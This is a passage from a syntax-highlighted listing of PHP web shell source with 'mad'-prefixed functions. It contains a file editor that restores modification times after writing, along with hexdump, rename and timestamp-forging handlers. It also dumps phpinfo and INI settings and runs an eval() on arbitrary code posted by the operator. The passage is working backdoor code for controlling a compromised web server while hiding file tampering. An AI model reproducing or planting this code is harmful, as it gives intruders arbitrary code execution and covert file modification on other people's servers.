<span class="lineno"> 792</span>                <span class="nv">$time</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 793</span>                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 794</span>                <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 795</span>                <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 796</span>                    <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
<span class="lineno"> 797</span>                    <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 798</span>                    <span class="k">echo</span> <span class="s1">&#39;Saved!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 799</span>                    <span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">);</span>
<span class="lineno"> 800</span>                <span class="p">}</span>
<span class="lineno"> 801</span>            <span class="p">}</span>
<span class="lineno"> 802</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,\&#39;1\&#39;+this.text.value);return false;&quot;&amp;gt;&amp;lt;textarea name=text class=bigarea&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 803</span>            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno"> 804</span>            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 805</span>                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
<span class="lineno"> 806</span>                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
<span class="lineno"> 807</span>                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 808</span>            <span class="p">}</span>
<span class="lineno"> 809</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 810</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 811</span>        <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span>
<span class="lineno"> 812</span>            <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 813</span>            <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 814</span>            <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&amp;lt;br&amp;gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="lineno"> 815</span>            <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 816</span>            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$len</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 817</span>                <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 818</span>                <span class="k">switch</span> <span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 819</span>                    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 820</span>                    <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 821</span>                    <span class="k">case</span> <span class="mi">10</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 822</span>                    <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 823</span>                    <span class="k">default</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 824</span>                <span class="p">}</span>
<span class="lineno"> 825</span>                <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 826</span>                <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 827</span>                    <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 828</span>                    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%08X&#39;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;}</span>
<span class="lineno"> 829</span>                    <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 830</span>                    <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 831</span>                <span class="p">}</span>
<span class="lineno"> 832</span>            <span class="p">}</span>
<span class="lineno"> 833</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table cellspacing=1 cellpadding=5 bgcolor=black&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=gray&amp;gt;&amp;lt;span style=&quot;font-weight: normal;&quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#282828&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 834</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 835</span>        <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span>
<span class="lineno"> 836</span>            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 837</span>                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span>
<span class="lineno"> 838</span>                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 839</span>                <span class="k">else</span>
<span class="lineno"> 840</span>                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&amp;gt;g(null,null,&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;,null,&quot;&quot;)&amp;lt;/script&amp;gt;&#39;</span><span class="p">);</span>
<span class="lineno"> 841</span>            <span class="p">}</span>
<span class="lineno"> 842</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=name value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 843</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 844</span>        <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span>
<span class="lineno"> 845</span>            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 846</span>                <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
<span class="lineno"> 847</span>                <span class="k">if</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 848</span>                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">))</span>
<span class="lineno"> 849</span>                        <span class="k">echo</span> <span class="s1">&#39;Fail!&#39;</span><span class="p">;</span>
<span class="lineno"> 850</span>                    <span class="k">else</span>
<span class="lineno"> 851</span>                        <span class="k">echo</span> <span class="s1">&#39;Touched!&#39;</span><span class="p">;</span>
<span class="lineno"> 852</span>                <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&#39;</span><span class="p">;</span>
<span class="lineno"> 853</span>            <span class="p">}</span>
<span class="lineno"> 854</span>            <span class="nb">clearstatcache</span><span class="p">();</span>
<span class="lineno"> 855</span>            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=touch value=&quot;&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 856</span>            <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 857</span>    <span class="p">}</span>
<span class="lineno"> 858</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 859</span>    <span class="nx">madFooter</span><span class="p">();</span>
<span class="lineno"> 860</span> <span class="p">}</span>  
<span class="lineno"> 861</span> 
<span class="lineno"> 862</span> <span class="k">function</span> <span class="nf">madphpeval</span><span class="p">()</span>
<span class="lineno"> 863</span> <span class="p">{</span>
<span class="lineno"> 864</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno"> 865</span>     
<span class="lineno"> 866</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ini&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 867</span>        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 868</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 869</span>        <span class="nv">$INI</span><span class="o">=</span><span class="nb">ini_get_all</span><span class="p">();</span> 
<span class="lineno"> 870</span> <span class="k">print</span> <span class="s1">&#39;&amp;lt;table border=0&amp;gt;&amp;lt;tr&amp;gt;&#39;</span>
<span class="lineno"> 871</span>    <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Param&amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 872</span>    <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Global value&amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 873</span>    <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Local Value&amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 874</span>    <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;font class=&quot;highlight_txt&quot;&amp;gt;Access&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 875</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$INI</span> <span class="k">as</span> <span class="nv">$param</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$values</span><span class="p">)</span> 
<span class="lineno"> 876</span>    <span class="k">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&#39;</span>
<span class="lineno"> 877</span>        <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$param</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 878</span>        <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$values</span><span class="p">[</span><span class="s1">&#39;global_value&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 879</span>        <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$values</span><span class="p">[</span><span class="s1">&#39;local_value&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/td&amp;gt;&#39;</span>
<span class="lineno"> 880</span>        <span class="o">.</span><span class="s1">&#39;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$values</span><span class="p">[</span><span class="s1">&#39;access&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 881</span>        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 882</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 883</span>        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 884</span>        <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h1&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;h2&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 885</span>    <span class="p">}</span>
<span class="lineno"> 886</span>     
<span class="lineno"> 887</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 888</span>        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&amp;lt;style&amp;gt;.p {color:#000;}&amp;lt;/style&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 889</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 890</span>        <span class="nb">phpinfo</span><span class="p">();</span>
<span class="lineno"> 891</span>        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
<span class="lineno"> 892</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 893</span>        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno"> 894</span>        <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h1&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;h2&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 895</span>    <span class="p">}</span>
<span class="lineno"> 896</span>     
<span class="lineno"> 897</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;exten&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 898</span>        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 899</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 900</span>         <span class="nv">$EXT</span><span class="o">=</span><span class="nb">get_loaded_extensions</span> <span class="p">();</span>
<span class="lineno"> 901</span>      <span class="k">print</span> <span class="s1">&#39;&amp;lt;table border=0&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span>
<span class="lineno"> 902</span>    <span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;listing&quot;&amp;gt;&#39;</span><span class="p">,</span> <span class="nv">$EXT</span><span class="p">)</span>
<span class="lineno"> 903</span>    <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span>
<span class="lineno"> 904</span>    <span class="o">.</span><span class="nb">count</span><span class="p">(</span><span class="nv">$EXT</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; extensions loaded&#39;</span><span class="p">;</span>
<span class="lineno"> 905</span>        
<span class="lineno"> 906</span>         
<span class="lineno"> 907</span>         <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 908</span>    <span class="p">}</span>
<span class="lineno"> 909</span>     
<span class="lineno"> 910</span>     
<span class="lineno"> 911</span>    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno"> 912</span>        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 913</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=header&amp;gt;&amp;lt;Center&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;ini\&#39;)&quot;&amp;gt;| INI_INFO | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;info\&#39;)&quot;&amp;gt;    | phpinfo |&amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;exten\&#39;)&quot;&amp;gt;   | extensions  |&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form name=pf method=post onsubmit=&quot;g(\&#39;phpeval\&#39;,null,this.code.value,\&#39;\&#39;); return false;&quot;&amp;gt;&amp;lt;textarea name=code class=bigarea id=PhpCode&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;center&amp;gt;&amp;lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&amp;gt;&amp;lt;/center&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 914</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/form&amp;gt;&amp;lt;pre id=PhpOutput style=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;margin-top:5px;&quot; class=ml1&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 915</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 916</span>        <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 917</span>        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 918</span>        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span>
<span class="lineno"> 919</span>    <span class="p">}</span>
<span class="lineno"> 920</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 921</span>   
<span class="lineno"> 922</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno"> 923</span> <span class="p">}</span>
<span class="lineno"> 924</span> 
<span class="lineno"> 925</span> <span class="k">function</span> <span class="nf">madhash</span><span class="p">()</span>
<span class="lineno"> 926</span> <span class="p">{</span>
<span class="lineno"> 927</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
